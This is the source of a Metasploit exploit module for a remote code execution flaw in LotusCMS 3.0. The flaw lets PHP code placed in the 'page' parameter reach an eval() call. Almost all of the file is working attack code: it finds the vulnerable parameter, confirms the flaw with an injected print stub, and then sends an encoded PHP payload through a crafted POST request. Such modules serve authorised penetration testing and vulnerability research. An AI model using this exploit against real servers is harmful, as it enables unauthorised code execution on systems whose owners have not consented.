# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
require &#039;msf/core&#039;
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
    include Msf::Exploit::Remote::HttpClient
    include Msf::Auxiliary::WmapScanUniqueQuery
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;LotusCMS 3.0 eval() Remote Command Execution&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a vulnerability found in Lotus CMS 3.0&#039;s Router()
                function.  This is done by embedding PHP code in the &#039;page&#039; parameter,
                which will be passed to a eval call, therefore allowing remote code execution.
                    The module can either automatically pick up a &#039;page&#039; parameter from the
                default page, or manually specify one in the URI option.  To use the automatic
                method, please supply the URI with just a directory path, for example: "/lcms/".
                To manually configure one, you may do: "/lcms/somepath/index.php?page=index"
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;Alligator Security Team&#039;,
                    &#039;dflah_ <dflah_[at]alligatorteam.org>&#039;,
                    &#039;sherl0ck_ <sherl0ck_[at]alligatorteam.org>&#039;,
                    &#039;sinn3r&#039;  #Metasploit-fu
                ],
            &#039;References&#039;     =>
                [
                    [ &#039;OSVDB&#039;, &#039;75095&#039; ],
                    [ &#039;URL&#039;, &#039;http://secunia.com/secunia_research/2011-21/&#039; ]
                ],
            &#039;Payload&#039;        =>
                {
                    &#039;DisableNops&#039; => true,
                    &#039;BadChars&#039;    => "#",
                    &#039;Keys&#039;        => [&#039;php&#039;]
                },
            &#039;Platform&#039;        => [ &#039;php&#039; ],
            &#039;Arch&#039;            => ARCH_PHP,
            &#039;Targets&#039;         => [[ &#039;Automatic LotusCMS 3.0&#039;, { }]],
            &#039;Privileged&#039;      => false,
            &#039;DisclosureDate&#039;  => &#039;Mar 3 2011&#039;,
            &#039;DefaultTarget&#039;   => 0))
        register_options(
        [
            OptString.new(&#039;URI&#039;, [true, &#039;URI&#039;, &#039;/lcms/&#039;]),
            Opt::RPORT(80),
        ], self.class)
    end
    def target_url
        uri = datastore[&#039;URI&#039;]
        # Make sure uri begins with &#039;/&#039;
        if uri[0] != &#039;/&#039;
            uri = &#039;/&#039; + uri
        end
        # Extract two things:
        # 1. The file path (/index.php), including the base
        # 2. GET parameters from the GET query
        uri   = uri.scan(/^(\/.+)\/(\w+\.php)*\?*(\w+=.+&*)*$/).flatten
        base  = (uri[0] || "") + &#039;/&#039;
        fname = uri[1] || ""
        query = uri[2] || ""
        params = queryparse(query) rescue ""
        # Use the user-supplied query if there&#039;s one, if not we&#039;ll auto-detect
        # by regexing a hyper-link
        if base.empty? or fname.empty? or params.empty?
            res = send_request_cgi({
                &#039;method&#039; => &#039;GET&#039;,
                &#039;uri&#039;    => datastore[&#039;URI&#039;]
            }, 20)
            if res and res.code == 200
                uri = res.body.scan(/<a.*href=[&#039;|"](\/*index\.php)\?.*(page=\w+)[&#039;|"].*>/).flatten
                @uri = base + uri[0]
                @arg = uri[1]
                print_status("Using found page param: #{@uri}?#{@arg}")
            else
                @uri = ""
                @arg = ""
            end
        else
            @uri = base + fname
            @arg = "page=#{params[&#039;page&#039;]}"
        end
    end
    def check
        target_url
        if @uri.empty? or @arg.empty?
            print_error("Unable to get the page parameter, please reconfigure URI")
            return
        end
        signature = rand_text_alpha(rand(10)+10)
        stub = "${print(&#039;#{signature}&#039;)};"
        sploit = "&#039;);#{stub}#"
        response = send_request_cgi(
        {
            &#039;method&#039;  => &#039;POST&#039;,
            &#039;uri&#039; =>  @uri,
            &#039;data&#039; => @arg + Rex::Text.uri_encode(sploit)
        }, 20)
        if response and response.body =~ /#{signature}/
            print_status("Signature: #{signature}")
            return Exploit::CheckCode::Vulnerable
        else
            print_error("Signature was not detected")
            return Exploit::CheckCode::Safe
        end
    end
    def exploit
        return if not check == Exploit::CheckCode::Vulnerable
        begin
            sploit = "&#039;);#{payload.encoded}#"
            print_status("Sending exploit ...")
            res = send_request_cgi(
            {
                &#039;method&#039;  => &#039;POST&#039;,
                &#039;uri&#039; =>  @uri,
                &#039;data&#039; => @arg + Rex::Text.uri_encode(sploit)
            }, 20)
            handler
        rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
        rescue ::Timeout::Error, ::Errno::EPIPE
        end
    end
end



